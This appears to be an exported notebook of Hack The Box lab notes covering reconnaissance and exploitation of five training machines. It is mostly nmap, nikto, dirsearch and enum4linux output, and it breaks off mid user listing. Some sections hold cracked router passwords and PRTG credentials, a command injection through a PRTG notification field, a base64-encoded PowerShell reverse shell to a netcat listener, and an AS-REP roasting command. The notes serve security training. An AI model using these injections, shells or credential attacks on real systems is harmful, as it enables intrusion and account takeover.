10.10.10.149<br />Host is up (0.10s latency).<br />Not shown: 65530 filtered ports<br />PORT      STATE SERVICE       VERSION<br />80/tcp    open  http          Microsoft IIS httpd 10.0<br />| http-cookie-flags: <br />|   /: <br />|     PHPSESSID: <br />|_      httponly flag not set<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />| http-title: Support Login Page<br />|_Requested resource was login.php<br />135/tcp   open  msrpc         Microsoft Windows RPC<br />445/tcp   open  microsoft-ds?<br />5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />49669/tcp open  msrpc         Microsoft Windows RPC<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -6m27s, deviation: 0s, median: -6m27s<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2019-10-21 16:13:20<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 212.00 seconds<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/></div><div class='page'><h1 class='title level-7'>80</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          92.242.140.21<br />+ Target Hostname:    http<br />+ Target Port:        80<br />+ Start Time:         2019-10-21 16:19:00 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: nginx<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Root page / redirects to: https://searchassist.verizon.com/dnserror.html<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ OSVDB-28260: //10.10.10.149:80/_vti_bin/shtml.dll/_vti_rpc?method=server+version%3a4%2e0%2e2%2e2611: Gives info about server settings. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0413, http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0709, http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0710, http://www.securityfocus.com/bid/1608, http://www.securityfocus.com/bid/1174.<br />+ OSVDB-28260: //10.10.10.149:80/_vti_bin/shtml.exe/_vti_rpc?method=server+version%3a4%2e0%2e2%2e2611: Gives info about server settings.<br />+ OSVDB-3092: //10.10.10.149:80/_vti_bin/_vti_aut/author.dll?method=list+documents%3a3%2e0%2e2%2e1706&amp;service%5fname=&amp;listHiddenDocs=true&amp;listExplorerDocs=true&amp;listRecurse=false&amp;listFiles=true&amp;listFolders=true&amp;listLinkInfo=true&amp;listIncludeParent=true&amp;listDerivedT=false&amp;listBorders=false: We seem to have authoring access to the FrontPage web.<br />+ OSVDB-3092: //10.10.10.149:80/_vti_bin/_vti_aut/author.exe?method=list+documents%3a3%2e0%2e2%2e1706&amp;service%5fname=&amp;listHiddenDocs=true&amp;listExplorerDocs=true&amp;listRecurse=false&amp;listFiles=true&amp;listFolders=true&amp;listLinkInfo=true&amp;listIncludeParent=true&amp;listDerivedT=false&amp;listBorders=false: We seem to have authoring access to the FrontPage web.<br />+ ERROR: Error limit (20) reached for host, giving up. Last error: <br />+ Scan terminated:  15 error(s) and 6 item(s) reported on remote host<br />+ End Time:           2019-10-21 16:25:05 (GMT-4) (365 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/HTB/Heist# <br /><br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-7'>80</h1><br/><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-21_16-18-59.log<br /><br />Target: http://http://10.10.10.149:80<br /><br />[16:19:00] Starting: <br />[16:19:01] 302 -    0B  - //10.10.10.149:80/index.php  -&gt;  login.php<br />[16:19:01] 403 -    1KB - //10.10.10.149:80/images/<br />[16:19:01] 200 -    2KB - //10.10.10.149:80/login.php<br />[16:19:03] 403 -    1KB - //10.10.10.149:80/Images/<br />[16:19:04] 302 -   16B  - //10.10.10.149:80/issues.php  -&gt;  login.php<br />[16:19:06] 403 -    1KB - //10.10.10.149:80/css/<br />[16:19:07] 302 -    0B  - //10.10.10.149:80/Index.php  -&gt;  login.php<br />[16:19:09] 200 -    2KB - //10.10.10.149:80/Login.php<br />[16:19:10] 403 -    1KB - //10.10.10.149:80/js/<br />[16:19:27] 302 -   16B  - //10.10.10.149:80/Issues.php  -&gt;  login.php<br />[16:19:29] 403 -    1KB - //10.10.10.149:80/attachments/<br />[16:19:38] 403 -    1KB - //10.10.10.149:80/IMAGES/<br />[16:19:53] 302 -    0B  - //10.10.10.149:80/INDEX.php  -&gt;  login.php<br />[16:20:28] 403 -    1KB - //10.10.10.149:80/CSS/    <br />[16:20:35] 403 -    1KB - //10.10.10.149:80/JS/    <br />[16:32:36] 403 -    1KB - //10.10.10.149:80/Attachments/   </div><div class='page'><h1 class='title level-6'>router config.txt</h1><br/>version 12.2<br />no service pad<br />service password-encryption<br />!<br />isdn switch-type basic-5ess<br />!<br />hostname ios-1<br />!<br />security passwords min-length 12<br />enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91<br />!<br />username rout3r password 7 0242114B0E143F015F5D1E161713<br />username admin privilege 15 password 7 02375012182C1A1D751618034F36415408<br />!<br />!<br />ip ssh authentication-retries 5<br />ip ssh version 2<br />!<br />!<br />router bgp 100<br /> synchronization<br /> bgp log-neighbor-changes<br /> bgp dampening<br /> network 192.168.0.0Â mask 300.255.255.0<br /> timers bgp 3 9<br /> redistribute connected<br />!<br />ip classless<br />ip route 0.0.0.0 0.0.0.0 192.168.0.1<br />!<br />!<br />access-list 101 permit ip any any<br />dialer-list 1 protocol ip list 101<br />!<br />no ip http server<br />no ip http secure-server<br />!<br />line vty 0 4<br /> session-timeout 600<br /> authorization exec SSH<br /> transport input ssh<br /><br /></div><div class='page'><h1 class='title level-6'>passwords</h1><br/>admin Q4)sJu\Y8qz*A3?d  --chase<br /><br />rout3r  $uperP@ssword<br /><br />stealth1agent   (Hazard ?)<br /><br />jason</div><div class='page'><h1 class='title level-4'>10.10.10.151 Sniper</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.151<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-21 00:26 EST<br />Nmap scan report for 10.10.10.151<br />Host is up (0.32s latency).<br />Not shown: 996 filtered ports<br />PORT    STATE SERVICE<br />80/tcp  open  http<br />135/tcp open  msrpc<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 123.25 seconds<br /></div><div class='page'><h1 class='title level-6'>long nmap</h1><br/>nmap -sC -sV -p- 10.10.10.151<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-21 00:26 EST<br />Nmap scan report for 10.10.10.151<br />Host is up (0.092s latency).<br />Not shown: 65530 filtered ports<br />PORT      STATE SERVICE       VERSION<br />80/tcp    open  http          Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: Sniper Co.<br />135/tcp   open  msrpc         Microsoft Windows RPC<br />139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br />445/tcp   open  microsoft-ds?<br />49667/tcp open  msrpc         Microsoft Windows RPC<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: 7h00m24s, deviation: 0s, median: 7h00m24s<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2019-12-21 07:34:02<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 482.71 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.151:80">http://10.10.10.151:80</a> --simple-report dirsearchsimple_10.10.10.151:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-12-21_00-30-09.log<br /><br />Target: <a href="http://10.10.10.151:80">http://10.10.10.151:80</a><br /><br />[00:30:09] Starting: <br />[00:30:10] 200 -    3KB - /index.php<br />[00:30:10] 403 -    1KB - /images/<br />[00:30:10] 200 -    6KB - /blog/<br />[00:30:11] 302 -    0B  - /user/  -&gt;  login.php<br />[00:30:11] 403 -    1KB - /Images/<br />[00:30:15] 403 -    1KB - /css/<br />[00:30:16] 200 -    3KB - /Index.php<br />[00:30:19] 403 -    1KB - /js/<br />[00:30:19] 200 -    6KB - /Blog/<br />[00:30:45] 403 -    1KB - /IMAGES/<br />[00:30:59] 200 -    3KB - /INDEX.php<br />[00:31:01] 302 -    0B  - /User/  -&gt;  login.php<br />[00:31:32] 403 -    1KB - /CSS/<br />[00:31:39] 403 -    1KB - /JS/<br /><br />Task Completed<br />root@kali:~/Desktop/Machines/HTB/Sniper# <br /><br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.10.10.151:80">http://10.10.10.151:80</a> | tee nikto_10.10.10.151:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.151<br />+ Target Hostname:    10.10.10.151<br />+ Target Port:        80<br />+ Start Time:         2019-12-21 00:30:09 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/10.0<br />+ Retrieved x-powered-by header: PHP/7.3.1<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Cookie PHPSESSID created without the httponly flag<br />+ 7499 requests: 0 error(s) and 7 item(s) reported on remote host<br />+ End Time:           2019-12-21 00:44:02 (GMT-5) (833 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/HTB/Sniper# <br /></div><div class='page'><h1 class='title level-4'>10.10.10.152 Netmon</h1><br/>Ftp anonymous in and grab user.txt<br />see that the machine is running PRTG Bandwidth monitor. Research shows that the website data is located at <code>C:\ProgramData\Paessler\PRTG Network Monitor\</code>.<br />PRTG Configuration.old.bak  is the oldest files. moreing through shows cleartext passwords. <br />              &lt;!-- User: prtgadmin --&gt;                                                          &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />              PrTg@dmin2018                     PrTg@dmin2019    <br />added one to the password to make it match the year and I got in<br /><br />under the notifications piece I was able to invoke a powershell command with the syntax<br />yeet | ping 10.10.14.60 (caught with tcp dump)<br />started nc listener<br />i then tried to run Invoke-PowerShellTcp.ps1. It failed (probably due to bad charachters)<br />copied a base64 encoded copy of the ps1 script with this command<br />cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard       &lt; base64 encodes script and copies to clipboard!<br />yeet | powershell -enc olkjsdflkjsdlfkjsldkjfsadl;kfj== <br />Enjoy the system shell!!<br /><br /></div><div class='page'><h1 class='title level-5'>Enumeration</h1><br/>root@kali:~/Desktop/Machines/HTB/Netmon# nmap -sC -sV -oN Netmon.nmap 10.10.10.152<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-20 21:31 EDT<br />Nmap scan report for 10.10.10.152<br />Host is up (0.15s latency).<br />Not shown: 995 closed ports<br />PORT    STATE SERVICE      VERSION<br />21/tcp  open  ftp          Microsoft ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| 02-03-19  12:18AM                 1024 .rnd<br />| 02-25-19  10:15PM       &lt;DIR&gt;          inetpub<br />| 07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs<br />| 02-25-19  10:56PM       &lt;DIR&gt;          Program Files<br />| 02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)<br />| 02-03-19  08:08AM       &lt;DIR&gt;          Users<br />|_02-25-19  11:49PM       &lt;DIR&gt;          Windows<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)<br />|_http-server-header: PRTG/18.1.37.13946<br />| http-title: Welcome | PRTG Network Monitor (NETMON)<br />|_Requested resource was /index.htm<br />|_http-trane-info: Problem with XML parsing of /evox/about<br />135/tcp open  msrpc        Microsoft Windows RPC<br />139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn<br />445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br />Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -30s, deviation: 0s, median: -30s<br />| smb-security-mode: <br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2019-07-20 21:31:12<br />|_  start_date: 2019-07-20 21:27:27<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 19.82 seconds<br /><br />root@kali:~/Desktop/Machines/HTB/Netmon# nmap -sV -T4 -p- 10.10.10.152<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-20 22:46 EDT<br />Nmap scan report for 10.10.10.152<br />Host is up (0.15s latency).<br />Not shown: 65522 closed ports<br />PORT      STATE SERVICE      VERSION<br />21/tcp    open  ftp          Microsoft ftpd<br />80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)<br />135/tcp   open  msrpc        Microsoft Windows RPC<br />139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn<br />445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br />5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />49664/tcp open  msrpc        Microsoft Windows RPC<br />49665/tcp open  msrpc        Microsoft Windows RPC<br />49666/tcp open  msrpc        Microsoft Windows RPC<br />49667/tcp open  msrpc        Microsoft Windows RPC<br />49668/tcp open  msrpc        Microsoft Windows RPC<br />49669/tcp open  msrpc        Microsoft Windows RPC<br />Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 533.45 seconds<br /><br />root@kali:~/Desktop/Machines/HTB/Netmon# nikto -host <a href="http://10.10.10.152:80">http://10.10.10.152:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.152<br />+ Target Hostname:    10.10.10.152<br />+ Target Port:        80<br />+ Start Time:         2019-07-20 22:42:25 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: PRTG/18.1.37.13946<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ Root page / redirects to: /index.htm<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Retrieved access-control-allow-origin header: *<br />+ OSVDB-250: /wwwboard/passwd.txt: The wwwboard password file is browsable. Change wwwboard to store this file elsewhere, or upgrade to the latest version.<br />+ OSVDB-2695: /photo/: My Photo Gallery pre 3.6 contains multiple vulnerabilities including directory traversal, unspecified vulnerabilities and remote management interface access.<br />+ OSVDB-2695: /photodata/: My Photo Gallery pre 3.6 contains multiple vulnerabilities including directory traversal, unspecified vulnerabilities and remote management interface access.<br />+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response<br />+ Scan terminated:  19 error(s) and 5 item(s) reported on remote host<br />+ End Time:           2019-07-20 23:21:14 (GMT-4) (2329 seconds)</div><div class='page'><h1 class='title level-5'>Passwords and Files</h1><br/><br />+ 1 host(s) tested<br /><br />netmon\administrator<br /><code>C:\ProgramData\Paessler\PRTG Network Monitor\</code>PRTG Configuration.old.bak                         &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />      <br />      <br />           &lt;/dbcredentials&gt;<br />            &lt;dbpassword&gt;<br />              &lt;!-- User: prtgadmin --&gt;                                                          &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />              PrTg@dmin2018                     PrTg@dmin2019                       &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />            &lt;/dbpassword&gt;<br />            &lt;dbtimeout&gt;<br />            <br />            &lt;proxyport&gt;<br />              8080<br />            <br />            authpHMACMD596<br /><br />                &lt;cell crypt=&quot;PRTG&quot;&gt;<br />                    N2GTUMO5FFKTWV3OPKWLJVH5XORCB5DVWWWQ====<br />                  &lt;/cell&gt;<br />                &lt;/snmpcommv1&gt;<br />                &lt;snmpcommv2&gt;<br />                  &lt;flags&gt;<br />                    &lt;encrypted/&gt;<br />                    &lt;inherited/&gt;<br />                  &lt;/flags&gt;<br />                  &lt;cell crypt=&quot;PRTG&quot;&gt;<br />                    JSHOKGVCCK4DYXNXFX7AZ47VUEFTLY5JZFSQ====<br />                    <br /> &quot;/program files (x86)/prtg network monitor/custom sensors&quot;<br /></div><div class='page'><h1 class='title level-4'>10.10.10.160 Postman</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><a href="https://github.com/JoeNibe/blog/blob/gh-pages/_posts/htb/_2019-12-16-postman.md">https://github.com/JoeNibe/blog/blob/gh-pages/_posts/htb/_2019-12-16-postman.md</a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.160<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-27 10:00 EST<br />Nmap scan report for 10.10.10.160<br />Host is up (0.11s latency).<br />Not shown: 997 closed ports<br />PORT      STATE SERVICE<br />22/tcp    open  ssh<br />80/tcp    open  http<br />10000/tcp open  snet-sensor-mgmt<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.00 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap -p-</h1><br/>nmap -sC -sV -p- 10.10.10.160<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-27 10:02 EST<br />Nmap scan report for 10.10.10.160<br />Host is up (0.10s latency).<br />Not shown: 65531 closed ports<br />PORT      STATE SERVICE VERSION<br />22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)<br />|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)<br />|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)<br />80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: The Cyber Geek&#39;s Personal Website<br />6379/tcp  open  redis   Redis key-value store 4.0.9<br />10000/tcp open  http    MiniServ 1.910 (Webmin httpd)<br />|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 7006.64 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap big</h1><br/></div><div class='page'><h1 class='title level-6'>80</h1><br/></div><div class='page'><h1 class='title level-7'>web nmap 80</h1><br/>PORT   STATE SERVICE REASON         VERSION<br />80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host <a href="http://10.10.10.160:80">http://10.10.10.160:80</a> | tee nikto_10.10.10.160:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.160<br />+ Target Hostname:    10.10.10.160<br />+ Target Port:        80<br />+ Start Time:         2020-01-27 10:03:05 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.29 (Ubuntu)<br />+ Server leaks inodes via ETags, header found with file /, fields: 0xf04 0x590f549ce0d74 <br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ IP address found in the &#39;location&#39; header. The IP is &quot;127.0.1.1&quot;.<br />+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is &quot;<a href="http://127.0.1.1/images/".">http://127.0.1.1/images/&quot;.</a><br />+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST <br />+ OSVDB-3268: /images/: Directory indexing found.<br />+ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 7500 requests: 0 error(s) and 10 item(s) reported on remote host<br />+ End Time:           2020-01-27 10:29:12 (GMT-5) (1567 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /><br /><br />      *********************************************************************<br />      Portions of the server&#39;s headers (Apache/2.4.29) are not in<br />      the Nikto database or are newer than the known string. Would you like<br />      to submit this information (*no server specific data*) to CIRT.net<br />      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? n<br /></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.160:80">http://10.10.10.160:80</a> --simple-report dirsearchsimple_10.10.10.160:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-20-01-27_10-03-06.log<br /><br />Target: <a href="http://10.10.10.160:80">http://10.10.10.160:80</a><br /><br />[10:03:06] Starting: <br />[10:03:06] 403 -  291B  - /.php<br />[10:03:06] 200 -    2KB - /images/<br />[10:03:08] 403 -  293B  - /icons/<br />[10:03:12] 200 -    8KB - /upload/<br />[10:03:14] 200 -    4KB - /css/<br />[10:03:20] 200 -    3KB - /js/<br />[10:03:56] 200 -    3KB - /fonts/<br />[10:42:26] 403 -  301B  - /server-status/<br /><br />Task Completed<br />root@kali:~/Desktop/Machines/HTB/Postman# <br /></div><div class='page'><h1 class='title level-6'>10000</h1><br/></div><div class='page'><h1 class='title level-7'>web nmap 10000</h1><br/>Scanned at 2020-01-27 10:03:05 EST for 117s<br /><br />PORT      STATE SERVICE REASON         VERSION<br />10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 (Webmin httpd)<br /><br />NSE: Script Post-scanning.<br /></div><div class='page'><h1 class='title level-4'>10.10.10.161 Forest</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>sebastien<br />lucinda<br />svc-alfresco<br />andy<br />mark<br />santi<br /><br />smbclient &#39;\\10.10.10.161\IPC$&#39;<br /><br />python ../GetNPUsers.py -request -format john HTB/svc-alfresco &gt; yee.txt     &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br /><br /><a href="https://github.com/Knowledge-Wisdom-Understanding/recon.git">https://github.com/Knowledge-Wisdom-Understanding/recon.git</a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/HTB/Forest# nmap 10.10.10.161<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-30 11:55 EDT<br />Nmap scan report for 10.10.10.161<br />Host is up (0.097s latency).<br />Not shown: 989 closed ports<br />PORT     STATE SERVICE<br />53/tcp   open  domain<br />88/tcp   open  kerberos-sec<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />389/tcp  open  ldap<br />445/tcp  open  microsoft-ds<br />464/tcp  open  kpasswd5<br />593/tcp  open  http-rpc-epmap<br />636/tcp  open  ldapssl<br />3268/tcp open  globalcatLDAP<br />3269/tcp open  globalcatLDAPssl<br /><br />Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds<br /></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>root@kali:~/Desktop/Machines/HTB/Forest# cat e4lresults.txt <br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Wed Oct 30 11:57:23 2019<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.161<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.161    |<br /> ==================================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ============================================ <br />|    Nbtstat Information for 10.10.10.161    |<br /> ============================================ <br />Looking up status of 10.10.10.161<br />No reply from 10.10.10.161<br /><br /> ===================================== <br />|    Session Check on 10.10.10.161    |<br /> ===================================== <br />[+] Server 10.10.10.161 allows sessions using username &#39;&#39;, password &#39;&#39;<br />[+] Got domain/workgroup name: <br /><br /> =========================================== <br />|    Getting domain SID for 10.10.10.161    |<br /> =========================================== <br />Domain Name: HTB<br />Domain Sid: S-1-5-21-3072663084-364016917-1341370565<br />[+] Host is part of a domain (not a workgroup)<br /><br /> ====================================== <br />|    OS information on 10.10.10.161    |<br /> ====================================== <br />[+] Got OS info for 10.10.10.161 from smbclient: <br />[+] Got OS info for 10.10.10.161 from srvinfo:<br />Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br /><br /> ============================= <br />|    Users on 10.10.10.161    |<br /> ============================= <br />index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)<br />index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain<br />index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: (null)<br />index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.<br />index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain<br />index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: (null)<br />index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: (null)<br />index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: 